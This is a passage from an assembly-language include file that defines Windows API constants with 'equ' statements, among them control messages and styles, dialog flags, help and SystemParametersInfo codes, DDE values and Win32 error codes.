EM_SETREADONLY equ 0CFh
EM_SETWORDBREAKPROC equ 0D0h
EM_GETWORDBREAKPROC equ 0D1h
EM_GETPASSWORDCHAR equ 0D2h
EM_SETMARGINS equ 0D3h
EM_GETMARGINS equ 0D4h
EM_SETLIMITTEXT equ EM_LIMITTEXT
EM_GETLIMITTEXT equ 0D5h
EM_POSFROMCHAR equ 0D6h
EM_CHARFROMPOS equ 0D7h
WB_LEFT equ 0
WB_RIGHT equ 1
WB_ISDELIMITER equ 2
BS_PUSHBUTTON equ 0h
BS_DEFPUSHBUTTON equ 1h
BS_CHECKBOX equ 2h
BS_AUTOCHECKBOX equ 3h
BS_RADIOBUTTON equ 4h
BS_3STATE equ 5h
BS_AUTO3STATE equ 6h
BS_GROUPBOX equ 7h
BS_USERBUTTON equ 8h
BS_AUTORADIOBUTTON equ 9h
BS_OWNERDRAW equ 0Bh
BS_LEFTTEXT equ 20h
BS_BITMAP equ 80h
BS_ICON equ 40h
BN_CLICKED equ 0
BN_PAINT equ 1
BN_HILITE equ 2
BN_UNHILITE equ 3
BN_DISABLE equ 4
BN_DOUBLECLICKED equ 5
BN_SETFOCUS equ 6
BN_KILLFOCUS equ 7
BST_UNCHECKED equ 00h
BST_CHECKED equ 01h
BST_INDETERMINATE equ 02h
BST_PUSHED equ 04h
BM_GETCHECK equ 0F0h
BM_SETCHECK equ 0F1h
BM_GETSTATE equ 0F2h
BM_SETSTATE equ 0F3h
BM_SETSTYLE equ 0F4h
BM_CLICK equ 0F5h
BM_GETIMAGE equ 0F6h
BM_SETIMAGE equ 0F7h
SS_LEFT equ 0h
SS_CENTER equ 1h
SS_RIGHT equ 2h
SS_ICON equ 3h
SS_BLACKRECT equ 4h
SS_GRAYRECT equ 5h
SS_WHITERECT equ 6h
SS_BLACKFRAME equ 7h
SS_GRAYFRAME equ 8h
SS_WHITEFRAME equ 9h
SS_USERITEM equ 0Ah
SS_SIMPLE equ 0Bh
SS_LEFTNOWORDWRAP equ 0Ch
SS_NOPREFIX equ 80h
STM_SETICON equ 170h
STM_GETICON equ 171h
STM_MSGMAX equ 172h
WC_DIALOG equ 8002
DWL_MSGRESULT equ 0
DWL_DLGPROC equ 4
DWL_USER equ 8
DDL_READWRITE equ 0h
DDL_READONLY equ 1h
DDL_HIDDEN equ 2h
DDL_SYSTEM equ 4h
DDL_DIRECTORY equ 10h
DDL_ARCHIVE equ 20h
DDL_POSTMSGS equ 2000h
DDL_DRIVES equ 4000h
DDL_EXCLUSIVE equ 8000h
DS_ABSALIGN equ 0001h
DS_SYSMODAL equ 0002h
DS_3DLOOK equ 0004h
DS_FIXEDSYS equ 0008h
DS_NOFAILCREATE equ 0010h
DS_LOCALEDIT equ 0020h
DS_SETFONT equ 0040h
DS_MODALFRAME equ 0080h
DS_NOIDLEMSG equ 0100h
DS_SETFOREGROUND equ 0200h
DS_CONTROL equ 0400h
DS_CENTER equ 0800h
DS_CENTERMOUSE equ 1000h
DS_CONTEXTHELP equ 2000h
DM_GETDEFID equ WM_USER+0
DM_SETDEFID equ WM_USER+1
DC_HASDEFID equ 534h
DLGC_WANTARROWS equ 1h
DLGC_WANTTAB equ 2h
DLGC_WANTALLKEYS equ 4h
DLGC_WANTMESSAGE equ 4h
DLGC_HASSETSEL equ 8h
DLGC_DEFPUSHBUTTON equ 10h
DLGC_UNDEFPUSHBUTTON equ 20h
DLGC_RADIOBUTTON equ 40h
DLGC_WANTCHARS equ 80h
DLGC_STATIC equ 100h
DLGC_BUTTON equ 2000h
LB_CTLCODE equ 0
LB_OKAY equ 0
LB_ERR equ -1
LB_ERRSPACE equ -2
LBN_ERRSPACE equ -2
LBN_SELCHANGE equ 1
LBN_DBLCLK equ 2
LBN_SELCANCEL equ 3
LBN_SETFOCUS equ 4
LBN_KILLFOCUS equ 5
LB_ADDSTRING equ 180h
LB_INSERTSTRING equ 181h
LB_DELETESTRING equ 182h
LB_SELITEMRANGEEX equ 183h
LB_RESETCONTENT equ 184h
LB_SETSEL equ 185h
LB_SETCURSEL equ 186h
LB_GETSEL equ 187h
LB_GETCURSEL equ 188h
LB_GETTEXT equ 189h
LB_GETTEXTLEN equ 18Ah
LB_GETCOUNT equ 18Bh
LB_SELECTSTRING equ 18Ch
LB_DIR equ 18Dh
LB_GETTOPINDEX equ 18Eh
LB_FINDSTRING equ 18Fh
LB_GETSELCOUNT equ 190h
LB_GETSELITEMS equ 191h
LB_SETTABSTOPS equ 192h
LB_GETHORIZONTALEXTENT equ 193h
LB_SETHORIZONTALEXTENT equ 194h
LB_SETCOLUMNWIDTH equ 195h
LB_ADDFILE equ 196h
LB_SETTOPINDEX equ 197h
LB_GETITEMRECT equ 198h
LB_GETITEMDATA equ 199h
LB_SETITEMDATA equ 19Ah
LB_SELITEMRANGE equ 19Bh
LB_SETANCHORINDEX equ 19Ch
LB_GETANCHORINDEX equ 19Dh
LB_SETCARETINDEX equ 19Eh
LB_GETCARETINDEX equ 19Fh
LB_SETITEMHEIGHT equ 1A0h
LB_GETITEMHEIGHT equ 1A1h
LB_FINDSTRINGEXACT equ 1A2h
LB_SETLOCALE equ 1A5h
LB_GETLOCALE equ 1A6h
LB_SETCOUNT equ 1A7h
LB_MSGMAX equ 1A8h
LBS_NOTIFY equ 1h
LBS_SORT equ 2h
LBS_NOREDRAW equ 4h
LBS_MULTIPLESEL equ 8h
LBS_OWNERDRAWFIXED equ 10h
LBS_OWNERDRAWVARIABLE equ 20h
LBS_HASSTRINGS equ 40h
LBS_USETABSTOPS equ 80h
LBS_NOINTEGRALHEIGHT equ 100h
LBS_MULTICOLUMN equ 200h
LBS_WANTKEYBOARDINPUT equ 400h
LBS_EXTENDEDSEL equ 800h
LBS_DISABLENOSCROLL equ 1000h
LBS_NODATA equ 2000h
LBS_STANDARD equ LBS_NOTIFY|LBS_SORT|WS_VSCROLL|WS_BORDER
CB_OKAY equ 0
CB_ERR equ -1
CB_ERRSPACE equ -2
CBN_ERRSPACE equ -1
CBN_SELCHANGE equ 1
CBN_DBLCLK equ 2
CBN_SETFOCUS equ 3
CBN_KILLFOCUS equ 4
CBN_EDITCHANGE equ 5
CBN_EDITUPDATE equ 6
CBN_DROPDOWN equ 7
CBN_CLOSEUP equ 8
CBN_SELENDOK equ 9
CBN_SELENDCANCEL equ 10
CBS_SIMPLE equ 1h
CBS_DROPDOWN equ 2h
CBS_DROPDOWNLIST equ 3h
CBS_OWNERDRAWFIXED equ 10h
CBS_OWNERDRAWVARIABLE equ 20h
CBS_AUTOHSCROLL equ 40h
CBS_OEMCONVERT equ 80h
CBS_SORT equ 100h
CBS_HASSTRINGS equ 200h
CBS_NOINTEGRALHEIGHT equ 400h
CBS_DISABLENOSCROLL equ 800h
CB_GETEDITSEL equ 140h
CB_LIMITTEXT equ 141h
CB_SETEDITSEL equ 142h
CB_ADDSTRING equ 143h
CB_DELETESTRING equ 144h
CB_DIR equ 145h
CB_GETCOUNT equ 146h
CB_GETCURSEL equ 147h
CB_GETLBTEXT equ 148h
CB_GETLBTEXTLEN equ 149h
CB_INSERTSTRING equ 14Ah
CB_RESETCONTENT equ 14Bh
CB_FINDSTRING equ 14Ch
CB_SELECTSTRING equ 14Dh
CB_SETCURSEL equ 14Eh
CB_SHOWDROPDOWN equ 14Fh
CB_GETITEMDATA equ 150h
CB_SETITEMDATA equ 151h
CB_GETDROPPEDCONTROLRECT equ 152h
CB_SETITEMHEIGHT equ 153h
CB_GETITEMHEIGHT equ 154h
CB_SETEXTENDEDUI equ 155h
CB_GETEXTENDEDUI equ 156h
CB_GETDROPPEDSTATE equ 157h
CB_FINDSTRINGEXACT equ 158h
CB_SETLOCALE equ 159h
CB_GETLOCALE equ 15Ah
CB_GETTOPINDEX equ 15Bh
CB_SETTOPINDEX equ 15Ch
CB_GETHORIZONTALEXTENT equ 15Dh
CB_SETHORIZONTALEXTENT equ 15Eh
CB_GETDROPPEDWIDTH equ 15Fh
CB_SETDROPPEDWIDTH equ 160h
CB_INITSTORAGE equ 161h
CB_MSGMAX equ 162h
SBS_HORZ equ 0h
SBS_VERT equ 1h
SBS_TOPALIGN equ 2h
SBS_LEFTALIGN equ 2h
SBS_BOTTOMALIGN equ 4h
SBS_RIGHTALIGN equ 4h
SBS_SIZEBOXTOPLEFTALIGN equ 2h
SBS_SIZEBOXBOTTOMRIGHTALIGN equ 4h
SBS_SIZEBOX equ 8h
SBS_SIZEGRIP equ 10h
SBM_SETPOS equ 0E0h
SBM_GETPOS equ 0E1h
SBM_SETRANGE equ 0E2h
SBM_SETRANGEREDRAW equ 0E6h
SBM_GETRANGE equ 0E3h
SBM_ENABLE_ARROWS equ 0E4h
MDIS_ALLCHILDSTYLES equ 1h
MDITILE_VERTICAL equ 0h
MDITILE_HORIZONTAL equ 1h
MDITILE_SKIPDISABLED equ 2h
HELP_CONTEXT equ 1h
HELP_QUIT equ 2h
HELP_INDEX equ 3h
HELP_CONTENTS equ 3h
HELP_HELPONHELP equ 4h
HELP_SETINDEX equ 5h
HELP_SETCONTENTS equ 5h
HELP_CONTEXTPOPUP equ 8h
HELP_FORCEFILE equ 9h
HELP_KEY equ 101h
HELP_COMMAND equ 102h
HELP_PARTIALKEY equ 105h
HELP_MULTIKEY equ 201h
HELP_SETWINPOS equ 203h
HELP_CONTEXTMENU equ 000Ah
HELP_FINDER equ 000Bh
HELP_WM_HELP equ 000Ch
HELP_SETPOPUP_POS equ 000Dh
HELP_TCARD equ 8000h
HELP_TCARD_DATA equ 0010h
HELP_TCARD_OTHER_CALLER equ 0011h
IDH_NO_HELP equ 28440
IDH_MISSING_CONTEXT equ 28441
IDH_GENERIC_HELP_BUTTON equ 28442
IDH_OK equ 28443
IDH_CANCEL equ 28444
IDH_HELP equ 28445
SPI_GETBEEP equ 1
SPI_SETBEEP equ 2
SPI_GETMOUSE equ 3
SPI_SETMOUSE equ 4
SPI_GETBORDER equ 5
SPI_SETBORDER equ 6
SPI_GETKEYBOARDSPEED equ 10
SPI_SETKEYBOARDSPEED equ 11
SPI_LANGDRIVER equ 12
SPI_ICONHORIZONTALSPACING equ 13
SPI_GETSCREENSAVETIMEOUT equ 14
SPI_SETSCREENSAVETIMEOUT equ 15
SPI_GETSCREENSAVEACTIVE equ 16
SPI_SETSCREENSAVEACTIVE equ 17
SPI_GETGRIDGRANULARITY equ 18
SPI_SETGRIDGRANULARITY equ 19
SPI_SETDESKWALLPAPER equ 20
SPI_SETDESKPATTERN equ 21
SPI_GETKEYBOARDDELAY equ 22
SPI_SETKEYBOARDDELAY equ 23
SPI_ICONVERTICALSPACING equ 24
SPI_GETICONTITLEWRAP equ 25
SPI_SETICONTITLEWRAP equ 26
SPI_GETMENUDROPALIGNMENT equ 27
SPI_SETMENUDROPALIGNMENT equ 28
SPI_SETDOUBLECLKWIDTH equ 29
SPI_SETDOUBLECLKHEIGHT equ 30
SPI_GETICONTITLELOGFONT equ 31
SPI_SETDOUBLECLICKTIME equ 32
SPI_SETMOUSEBUTTONSWAP equ 33
SPI_SETICONTITLELOGFONT equ 34
SPI_GETFASTTASKSWITCH equ 35
SPI_SETFASTTASKSWITCH equ 36
SPI_SETDRAGFULLWINDOWS equ 37
SPI_GETDRAGFULLWINDOWS equ 38
SPI_GETNONCLIENTMETRICS equ 41
SPI_SETNONCLIENTMETRICS equ 42
SPI_GETMINIMIZEDMETRICS equ 43
SPI_SETMINIMIZEDMETRICS equ 44
SPI_GETICONMETRICS equ 45
SPI_SETICONMETRICS equ 46
SPI_SETWORKAREA equ 47
SPI_GETWORKAREA equ 48
SPI_SETPENWINDOWS equ 49
SPI_GETFILTERKEYS equ 50
SPI_SETFILTERKEYS equ 51
SPI_GETTOGGLEKEYS equ 52
SPI_SETTOGGLEKEYS equ 53
SPI_GETMOUSEKEYS equ 54
SPI_SETMOUSEKEYS equ 55
SPI_GETSHOWSOUNDS equ 56
SPI_SETSHOWSOUNDS equ 57
SPI_GETSTICKYKEYS equ 58
SPI_SETSTICKYKEYS equ 59
SPI_GETACCESSTIMEOUT equ 60
SPI_SETACCESSTIMEOUT equ 61
SPI_GETSERIALKEYS equ 62
SPI_SETSERIALKEYS equ 63
SPI_GETSOUNDSENTRY equ 64
SPI_SETSOUNDSENTRY equ 65
SPI_GETHIGHCONTRAST equ 66
SPI_SETHIGHCONTRAST equ 67
SPI_GETKEYBOARDPREF equ 68
SPI_SETKEYBOARDPREF equ 69
SPI_GETSCREENREADER equ 70
SPI_SETSCREENREADER equ 71
SPI_GETANIMATION equ 72
SPI_SETANIMATION equ 73
SPI_GETFONTSMOOTHING equ 74
SPI_SETFONTSMOOTHING equ 75
SPI_SETDRAGWIDTH equ 76
SPI_SETDRAGHEIGHT equ 77
SPI_SETHANDHELD equ 78
SPI_GETLOWPOWERTIMEOUT equ 79
SPI_GETPOWEROFFTIMEOUT equ 80
SPI_SETLOWPOWERTIMEOUT equ 81
SPI_SETPOWEROFFTIMEOUT equ 82
SPI_GETLOWPOWERACTIVE equ 83
SPI_GETPOWEROFFACTIVE equ 84
SPI_SETLOWPOWERACTIVE equ 85
SPI_SETPOWEROFFACTIVE equ 86
SPI_SETCURSORS equ 87
SPI_SETICONS equ 88
SPI_GETDEFAULTINPUTLANG equ 89
SPI_SETDEFAULTINPUTLANG equ 90
SPI_SETLANGTOGGLE equ 91
SPI_GETWINDOWSEXTENSION equ 92
SPI_SETMOUSETRAILS equ 93
SPI_GETMOUSETRAILS equ 94
SPI_SCREENSAVERRUNNING equ 97
SPIF_UPDATEINIFILE equ 1h
SPIF_SENDWININICHANGE equ 2h
WM_DDE_FIRST equ 3E0h
WM_DDE_INITIATE equ WM_DDE_FIRST
WM_DDE_TERMINATE equ WM_DDE_FIRST+1
WM_DDE_ADVISE equ WM_DDE_FIRST+2
WM_DDE_UNADVISE equ WM_DDE_FIRST+3
WM_DDE_ACK equ WM_DDE_FIRST+4
WM_DDE_DATA equ WM_DDE_FIRST+5
WM_DDE_REQUEST equ WM_DDE_FIRST+6
WM_DDE_POKE equ WM_DDE_FIRST+7
WM_DDE_EXECUTE equ WM_DDE_FIRST+8
WM_DDE_LAST equ WM_DDE_FIRST+8
XST_NULL equ 0
XST_INCOMPLETE equ 1
XST_CONNECTED equ 2
XST_INIT1 equ 3
XST_INIT2 equ 4
XST_REQSENT equ 5
XST_DATARCVD equ 6
XST_POKESENT equ 7
XST_POKEACKRCVD equ 8
XST_EXECSENT equ 9
XST_EXECACKRCVD equ 10
XST_ADVSENT equ 11
XST_UNADVSENT equ 12
XST_ADVACKRCVD equ 13
XST_UNADVACKRCVD equ 14
XST_ADVDATASENT equ 15
XST_ADVDATAACKRCVD equ 16
CADV_LATEACK equ 0FFFFh
ST_CONNECTED equ 1h
ST_ADVISE equ 2h
ST_ISLOCAL equ 4h
ST_BLOCKED equ 8h
ST_CLIENT equ 10h
ST_TERMINATED equ 20h
ST_INLIST equ 40h
ST_BLOCKNEXT equ 80h
ST_ISSELF equ 100h
DDE_FACK equ 8000h
DDE_FBUSY equ 4000h
DDE_FDEFERUPD equ 4000h
DDE_FACKREQ equ 8000h
DDE_FRELEASE equ 2000h
DDE_FREQUESTED equ 1000h
DDE_FAPPSTATUS equ 0FFh
DDE_FNOTPROCESSED equ 0h
DDE_FACKRESERVED equ (-1-DDE_FACK)|DDE_FBUSY|DDE_FAPPSTATUS
DDE_FADVRESERVED equ (-1-DDE_FACKREQ)|DDE_FDEFERUPD
DDE_FDATRESERVED equ (-1-DDE_FACKREQ)|DDE_FRELEASE|DDE_FREQUESTED
DDE_FPOKRESERVED equ (-1-DDE_FRELEASE)
CP_WINANSI equ 1004
CP_WINUNICODE equ 1200
XTYPF_NOBLOCK equ 2h
XTYPF_NODATA equ 4h
XTYPF_ACKREQ equ 8h
XCLASS_MASK equ 0FC00h
XCLASS_BOOL equ 1000h
XCLASS_DATA equ 2000h
XCLASS_FLAGS equ 4000h
XCLASS_NOTIFICATION equ 8000h
XTYP_ERROR equ 0h|XCLASS_NOTIFICATION|XTYPF_NOBLOCK
XTYP_ADVDATA equ 10h|XCLASS_FLAGS
XTYP_ADVREQ equ 20h|XCLASS_DATA|XTYPF_NOBLOCK
XTYP_ADVSTART equ 30h|XCLASS_BOOL
XTYP_ADVSTOP equ 40h|XCLASS_NOTIFICATION
XTYP_EXECUTE equ 50h|XCLASS_FLAGS
XTYP_CONNECT equ 60h|XCLASS_BOOL|XTYPF_NOBLOCK
XTYP_CONNECT_CONFIRM equ 70h|XCLASS_NOTIFICATION|XTYPF_NOBLOCK
XTYP_XACT_COMPLETE equ 80h|XCLASS_NOTIFICATION
XTYP_POKE equ 90h|XCLASS_FLAGS
XTYP_REGISTER equ 0A0h|XCLASS_NOTIFICATION|XTYPF_NOBLOCK
XTYP_REQUEST equ 0B0h|XCLASS_DATA
XTYP_DISCONNECT equ 0C0h|XCLASS_NOTIFICATION|XTYPF_NOBLOCK
XTYP_UNREGISTER equ 0D0h|XCLASS_NOTIFICATION|XTYPF_NOBLOCK
XTYP_WILDCONNECT equ 0E0h|XCLASS_DATA|XTYPF_NOBLOCK
XTYP_MASK equ 0F0h
XTYP_SHIFT equ 4
TIMEOUT_ASYNC equ 0FFFFh
QID_SYNC equ 0FFFFh
CBR_BLOCK equ 0FFFFh
CBF_FAIL_SELFCONNECTIONS equ 1000h
CBF_FAIL_CONNECTIONS equ 2000h
CBF_FAIL_ADVISES equ 4000h
CBF_FAIL_EXECUTES equ 8000h
CBF_FAIL_POKES equ 10000h
CBF_FAIL_REQUESTS equ 20000h
CBF_FAIL_ALLSVRXACTIONS equ 3F000h
CBF_SKIP_CONNECT_CONFIRMS equ 40000h
CBF_SKIP_REGISTRATIONS equ 80000h
CBF_SKIP_UNREGISTRATIONS equ 100000h
CBF_SKIP_DISCONNECTS equ 200000h
CBF_SKIP_ALLNOTIFICATIONS equ 3C0000h
APPCMD_CLIENTONLY equ 10h
APPCMD_FILTERINITS equ 20h
APPCMD_MASK equ 0FF0h
APPCLASS_STANDARD equ 0h
APPCLASS_MASK equ 0Fh
EC_ENABLEALL equ 0
EC_ENABLEONE equ ST_BLOCKNEXT
EC_DISABLE equ ST_BLOCKED
EC_QUERYWAITING equ 2
DNS_REGISTER equ 1h
DNS_UNREGISTER equ 2h
DNS_FILTERON equ 4h
DNS_FILTEROFF equ 8h
HDATA_APPOWNED equ 1h
DMLERR_NO_ERROR equ 0
DMLERR_FIRST equ 4000h
DMLERR_ADVACKTIMEOUT equ 4000h
DMLERR_BUSY equ 4001h
DMLERR_DATAACKTIMEOUT equ 4002h
DMLERR_DLL_NOT_INITIALIZED equ 4003h
DMLERR_DLL_USAGE equ 4004h
DMLERR_EXECACKTIMEOUT equ 4005h
DMLERR_INVALIDPARAMETER equ 4006h
DMLERR_LOW_MEMORY equ 4007h
DMLERR_MEMORY_ERROR equ 4008h
DMLERR_NOTPROCESSED equ 4009h
DMLERR_NO_CONV_ESTABLISHED equ 400Ah
DMLERR_POKEACKTIMEOUT equ 400Bh
DMLERR_POSTMSG_FAILED equ 400Ch
DMLERR_REENTRANCY equ 400Dh
DMLERR_SERVER_DIED equ 400Eh
DMLERR_SYS_ERROR equ 400Fh
DMLERR_UNADVACKTIMEOUT equ 4010h
DMLERR_UNFOUND_QUEUE_ID equ 4011h
DMLERR_LAST equ 4011h
MH_CREATE equ 1
MH_KEEP equ 2
MH_DELETE equ 3
MH_CLEANUP equ 4
MAX_MONITORS equ 4
APPCLASS_MONITOR equ 1h
XTYP_MONITOR equ 0F0h|XCLASS_NOTIFICATION|XTYPF_NOBLOCK
MF_HSZ_INFO equ 1000000h
MF_SENDMSGS equ 2000000h
MF_POSTMSGS equ 4000000h
MF_CALLBACKS equ 8000000h
MF_ERRORS equ 10000000h
MF_LINKS equ 20000000h
MF_CONV equ 40000000h
MF_MASK equ 0FF000000h
NO_ERROR equ 0
ERROR_SUCCESS equ 0
ERROR_INVALID_FUNCTION equ 1
ERROR_FILE_NOT_FOUND equ 2
ERROR_PATH_NOT_FOUND equ 3
ERROR_TOO_MANY_OPEN_FILES equ 4
ERROR_ACCESS_DENIED equ 5
ERROR_INVALID_HANDLE equ 6
ERROR_ARENA_TRASHED equ 7
ERROR_NOT_ENOUGH_MEMORY equ 8
ERROR_INVALID_BLOCK equ 9
ERROR_BAD_ENVIRONMENT equ 10
ERROR_BAD_FORMAT equ 11
ERROR_INVALID_ACCESS equ 12
ERROR_INVALID_DATA equ 13
ERROR_OUTOFMEMORY equ 14
ERROR_INVALID_DRIVE equ 15
ERROR_CURRENT_DIRECTORY equ 16
ERROR_NOT_SAME_DEVICE equ 17
ERROR_NO_MORE_FILES equ 18
ERROR_WRITE_PROTECT equ 19
ERROR_BAD_UNIT equ 20
ERROR_NOT_READY equ 21
ERROR_BAD_COMMAND equ 22
ERROR_CRC equ 23
ERROR_BAD_LENGTH equ 24
ERROR_SEEK equ 25
ERROR_NOT_DOS_DISK equ 26
ERROR_SECTOR_NOT_FOUND equ 27
ERROR_OUT_OF_PAPER equ 28
ERROR_WRITE_FAULT equ 29
ERROR_READ_FAULT equ 30
ERROR_GEN_FAILURE equ 31
ERROR_SHARING_VIOLATION equ 32
ERROR_LOCK_VIOLATION equ 33
ERROR_WRONG_DISK equ 34
ERROR_SHARING_BUFFER_EXCEEDED equ 36
ERROR_HANDLE_EOF equ 38
ERROR_HANDLE_DISK_FULL equ 39
ERROR_NOT_SUPPORTED equ 50
ERROR_REM_NOT_LIST equ 51
ERROR_DUP_NAME equ 52
ERROR_BAD_NETPATH equ 53
ERROR_NETWORK_BUSY equ 54
ERROR_DEV_NOT_EXIST equ 55
ERROR_TOO_MANY_CMDS equ 56
ERROR_ADAP_HDW_ERR equ 57
ERROR_BAD_NET_RESP equ 58
ERROR_UNEXP_NET_ERR equ 59
ERROR_BAD_REM_ADAP equ 60
ERROR_PRINTQ_FULL equ 61
ERROR_NO_SPOOL_SPACE equ 62
ERROR_PRINT_CANCELLED equ 63
ERROR_NETNAME_DELETED equ 64
ERROR_NETWORK_ACCESS_DENIED equ 65
ERROR_BAD_DEV_TYPE equ 66
ERROR_BAD_NET_NAME equ 67
ERROR_TOO_MANY_NAMES equ 68
ERROR_TOO_MANY_SESS equ 69
ERROR_SHARING_PAUSED equ 70
ERROR_REQ_NOT_ACCEP equ 71
ERROR_REDIR_PAUSED equ 72
ERROR_FILE_EXISTS equ 80
ERROR_CANNOT_MAKE equ 82
ERROR_FAIL_I24 equ 83
ERROR_OUT_OF_STRUCTURES equ 84
ERROR_ALREADY_ASSIGNED equ 85
ERROR_INVALID_PASSWORD equ 86
ERROR_INVALID_PARAMETER equ 87
ERROR_NET_WRITE_FAULT equ 88
ERROR_NO_PROC_SLOTS equ 89
ERROR_TOO_MANY_SEMAPHORES equ 100
ERROR_EXCL_SEM_ALREADY_OWNED equ 101
ERROR_SEM_IS_SET equ 102
ERROR_TOO_MANY_SEM_REQUESTS equ 103
ERROR_INVALID_AT_INTERRUPT_TIME equ 104
ERROR_SEM_OWNER_DIED equ 105
ERROR_SEM_USER_LIMIT equ 106
ERROR_DISK_CHANGE equ 107
ERROR_DRIVE_LOCKED equ 108
ERROR_BROKEN_PIPE equ 109
ERROR_OPEN_FAILED equ 110
ERROR_BUFFER_OVERFLOW equ 111
ERROR_DISK_FULL equ 112
ERROR_NO_MORE_SEARCH_HANDLES equ 113
ERROR_INVALID_TARGET_HANDLE equ 114
ERROR_INVALID_CATEGORY equ 117
ERROR_INVALID_VERIFY_SWITCH equ 118
ERROR_BAD_DRIVER_LEVEL equ 119
ERROR_CALL_NOT_IMPLEMENTED equ 120
ERROR_SEM_TIMEOUT equ 121
ERROR_INSUFFICIENT_BUFFER equ 122
ERROR_INVALID_NAME equ 123
ERROR_INVALID_LEVEL equ 124
ERROR_NO_VOLUME_LABEL equ 125
ERROR_MOD_NOT_FOUND equ 126
ERROR_PROC_NOT_FOUND equ 127
ERROR_WAIT_NO_CHILDREN equ 128
ERROR_CHILD_NOT_COMPLETE equ 129
ERROR_DIRECT_ACCESS_HANDLE equ 130
ERROR_NEGATIVE_SEEK equ 131
ERROR_SEEK_ON_DEVICE equ 132
ERROR_IS_JOIN_TARGET equ 133
ERROR_IS_JOINED equ 134
ERROR_IS_SUBSTED equ 135
ERROR_NOT_JOINED equ 136
ERROR_NOT_SUBSTED equ 137
ERROR_JOIN_TO_JOIN equ 138
ERROR_SUBST_TO_SUBST equ 139
ERROR_JOIN_TO_SUBST equ 140
ERROR_SUBST_TO_JOIN equ 141
ERROR_BUSY_DRIVE equ 142
ERROR_SAME_DRIVE equ 143
ERROR_DIR_NOT_ROOT equ 144
ERROR_DIR_NOT_EMPTY equ 145
ERROR_IS_SUBST_PATH equ 146
ERROR_IS_JOIN_PATH equ 147
ERROR_PATH_BUSY equ 148
ERROR_IS_SUBST_TARGET equ 149
ERROR_SYSTEM_TRACE equ 150
ERROR_INVALID_EVENT_COUNT equ 151
ERROR_TOO_MANY_MUXWAITERS equ 152
ERROR_INVALID_LIST_FORMAT equ 153
ERROR_LABEL_TOO_LONG equ 154
ERROR_TOO_MANY_TCBS equ 155
ERROR_SIGNAL_REFUSED equ 156
ERROR_DISCARDED equ 157
ERROR_NOT_LOCKED equ 158
ERROR_BAD_THREADID_ADDR equ 159
ERROR_BAD_ARGUMENTS equ 160
ERROR_BAD_PATHNAME equ 161
ERROR_SIGNAL_PENDING equ 162
ERROR_MAX_THRDS_REACHED equ 164
ERROR_LOCK_FAILED equ 167
ERROR_BUSY equ 170
ERROR_CANCEL_VIOLATION equ 173
ERROR_ATOMIC_LOCKS_NOT_SUPPORTED equ 174
ERROR_INVALID_SEGMENT_NUMBER equ 180
ERROR_INVALID_ORDINAL equ 182
ERROR_ALREADY_EXISTS equ 183
ERROR_INVALID_FLAG_NUMBER equ 186
ERROR_SEM_NOT_FOUND equ 187
ERROR_INVALID_STARTING_CODESEG equ 188
ERROR_INVALID_STACKSEG equ 189
ERROR_INVALID_MODULETYPE equ 190
ERROR_INVALID_EXE_SIGNATURE equ 191
ERROR_EXE_MARKED_INVALID equ 192
ERROR_BAD_EXE_FORMAT equ 193
ERROR_ITERATED_DATA_EXCEEDS_64k equ 194
ERROR_INVALID_MINALLOCSIZE equ 195
ERROR_DYNLINK_FROM_INVALID_RING equ 196
ERROR_IOPL_NOT_ENABLED equ 197
ERROR_INVALID_SEGDPL equ 198
ERROR_AUTODATASEG_EXCEEDS_64k equ 199
ERROR_RING2SEG_MUST_BE_MOVABLE equ 200
ERROR_RELOC_CHAIN_XEEDS_SEGLIM equ 201
ERROR_INFLOOP_IN_RELOC_CHAIN equ 202
ERROR_ENVVAR_NOT_FOUND equ 203
ERROR_NO_SIGNAL_SENT equ 205
ERROR_FILENAME_EXCED_RANGE equ 206
ERROR_RING2_STACK_IN_USE equ 207
ERROR_META_EXPANSION_TOO_LONG equ 208
ERROR_INVALID_SIGNAL_NUMBER equ 209
ERROR_THREAD_1_INACTIVE equ 210
ERROR_LOCKED equ 212
ERROR_TOO_MANY_MODULES equ 214
ERROR_NESTING_NOT_ALLOWED equ 215
ERROR_BAD_PIPE equ 230
ERROR_PIPE_BUSY equ 231
ERROR_NO_DATA equ 232
ERROR_PIPE_NOT_CONNECTED equ 233
ERROR_MORE_DATA equ 234
ERROR_VC_DISCONNECTED equ 240
ERROR_INVALID_EA_NAME equ 254
ERROR_EA_LIST_INCONSISTENT equ 255
ERROR_NO_MORE_ITEMS equ 259
ERROR_CANNOT_COPY equ 266
ERROR_DIRECTORY equ 267
ERROR_EAS_DIDNT_FIT equ 275
ERROR_EA_FILE_CORRUPT equ 276
ERROR_EA_TABLE_FULL equ 277
ERROR_INVALID_EA_HANDLE equ 278
ERROR_EAS_NOT_SUPPORTED equ 282
ERROR_NOT_OWNER equ 288
ERROR_TOO_MANY_POSTS equ 298
ERROR_MR_MID_NOT_FOUND equ 317
ERROR_INVALID_ADDRESS equ 487
ERROR_ARITHMETIC_OVERFLOW equ 534
ERROR_PIPE_CONNECTED equ 535
ERROR_PIPE_LISTENING equ 536
ERROR_EA_ACCESS_DENIED equ 994
ERROR_OPERATION_ABORTED equ 995
ERROR_IO_INCOMPLETE equ 996
ERROR_IO_PENDING equ 997
ERROR_NOACCESS equ 998
ERROR_SWAPERROR equ 999
ERROR_STACK_OVERFLOW equ 1001
ERROR_INVALID_MESSAGE equ 1002
ERROR_CAN_NOT_COMPLETE equ 1003
ERROR_INVALID_FLAGS equ 1004
ERROR_UNRECOGNIZED_VOLUME equ 1005
ERROR_FILE_INVALID equ 1006
ERROR_FULLSCREEN_MODE equ 1007
ERROR_NO_TOKEN equ 1008
ERROR_BADDB equ 1009
ERROR_BADKEY equ 1010
ERROR_CANTOPEN equ 1011
ERROR_CANTREAD equ 1012
ERROR_CANTWRITE equ 1013
ERROR_REGISTRY_RECOVERED equ 1014
ERROR_REGISTRY_CORRUPT equ 1015
ERROR_REGISTRY_IO_FAILED equ 1016
ERROR_NOT_REGISTRY_FILE equ 1017
ERROR_KEY_DELETED equ 1018
ERROR_NO_LOG_SPACE equ 1019
ERROR_KEY_HAS_CHILDREN equ 1020
ERROR_CHILD_MUST_BE_VOLATILE equ 1021
ERROR_NOTIFY_ENUM_DIR equ 1022
ERROR_DEPENDENT_SERVICES_RUNNING equ 1051
ERROR_INVALID_SERVICE_CONTROL equ 1052
ERROR_SERVICE_REQUEST_TIMEOUT equ 1053
ERROR_SERVICE_NO_THREAD equ 1054
ERROR_SERVICE_DATABASE_LOCKED equ 1055
ERROR_SERVICE_ALREADY_RUNNING equ 1056
ERROR_INVALID_SERVICE_ACCOUNT equ 1057
ERROR_SERVICE_DISABLED equ 1058
ERROR_CIRCULAR_DEPENDENCY equ 1059
